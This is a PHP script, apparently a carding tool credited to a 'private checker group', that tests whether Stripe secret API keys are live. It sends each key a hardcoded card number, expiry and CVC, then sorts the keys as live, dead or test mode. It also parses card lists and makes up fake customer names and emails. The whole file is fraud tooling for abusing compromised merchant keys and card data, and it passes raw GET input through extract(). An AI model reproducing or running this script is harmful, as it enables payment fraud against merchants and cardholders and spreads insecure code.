<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function RandomString($length = 23) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@olxbg.cf';
}

$sec = $_GET['lista'];

extract($_GET);
$lista = str_replace(" " , "", $lista);
$i = explode("|", $lista);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");
$name = RandomString();
$lastname = RandomString();

$pub = 'pk_live_';
///=========//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$d = curl_exec($ch);
$s = json_decode($d, true);
$sk3 = trim(strip_tags(getStr($d, '"code": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "description=Chillz Auth&source=".$s["id"]);
curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');



$e = curl_exec($ch);
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$cus = json_decode(curl_exec($ch), true);
$sk1 = trim(strip_tags(getStr($e,'"code": "','"')));
$sk2 = trim(strip_tags(getStr($e,'"message": "','"')));
$sk4 = trim(strip_tags(getStr($e,'"decline_code": "','"')));
$cvv = trim(strip_tags(getStr($e,'"cvc_check": "','"')));



if (strpos($e, 'api_key_expired')) {
    echo '<b><span class="text-danger">[Dead]</b></span> -> <span class="text-danger"> <b><i>- >'.$lista.'  ['.$sk1.'] </span>  </br>';
} elseif (strpos($e, 'Invalid API Key provided')) {
	echo '<b><span class="text-danger">[Dead]</b></span>-><span class="text-danger"> <b><i>-> '.$lista.' </span>  </br>';
} elseif (strpos($d, 'testmode_charges_only')) {
	echo '<b><span class="text-danger"> [TEST MODE] </b></span> -> <span class="text-danger"> <b><i>'.$lista.'</span>  </br>';
} elseif (strpos($e, 'test_mode_live_card')) {
	echo '<b><span class="text-danger"> [TEST MODE] </b></span> <span class="text-danger"> <b><i>'.$lista.'</span>  </br>';
} else {
    echo '<b><span class="text-success"> [SK LIVE]  </b></span> <span class="text-success"> <b><i> '.$lista.'</span>  </br>';
}

//====== Modified by ♤ C ♤ =========// credits to team PC.XYZ and PRIVATE CHECKER GROUP ====////
?>